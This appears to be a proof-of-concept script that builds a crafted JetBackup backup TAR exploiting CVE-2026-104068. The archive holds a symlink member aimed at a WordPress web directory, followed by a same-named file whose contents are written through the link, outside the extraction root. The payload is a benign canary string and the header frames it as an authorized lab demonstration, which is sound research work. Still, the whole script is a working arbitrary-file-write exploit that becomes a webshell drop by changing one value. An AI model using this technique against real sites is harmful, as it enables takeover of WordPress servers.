#!/usr/bin/env bash
# Builds a crafted JetBackup TAR that demonstrates CVE-2026-104068.
# The payload is a BENIGN marker string, not a webshell.
# For educational reproduction in an authorized local lab only.
set -euo pipefail
cd "$(dirname "$0")"

python3 - <<'PY'
import json, tarfile, io, time
now = int(time.time())

# Benign marker written outside the extraction directory.
TARGET  = "/var/www/html/wp-content/jb-poc-canary.txt"
PAYLOAD = b"JB-POC-CANARY\n"

meta = {
    "version": "1.0.3",
    "name": f"snap_{now}_poc",
    "backup_type": 1, "engine": 1, "contains": 1, "structure": 1,
    "schedules": [], "job_identifier": f"poc{now}", "created": now, "size": 1024,
    "params": {"site_url": "http://127.0.0.1:8080"},
    "items": [{"name": "homedir", "path": "files/files.tar", "size": 1024,
               "created": now, "backup_type": 1, "backup_contains": 1, "params": {}}],
}
raw = json.dumps(meta).encode()

with tarfile.open("jb-poc.tar", "w", format=tarfile.GNU_FORMAT) as t:
    i = tarfile.TarInfo("meta/meta.json"); i.size = len(raw); i.mtime = now
    t.addfile(i, io.BytesIO(raw))
    # (2) symlink member pointing outside the extraction root
    s = tarfile.TarInfo("jb-link"); s.type = tarfile.SYMTYPE
    s.linkname = TARGET; s.mtime = now
    t.addfile(s)
    # (3) regular file with the SAME name -> write follows the symlink
    f = tarfile.TarInfo("jb-link"); f.size = len(PAYLOAD); f.mtime = now
    t.addfile(f, io.BytesIO(PAYLOAD))
print("built jb-poc.tar")
PY
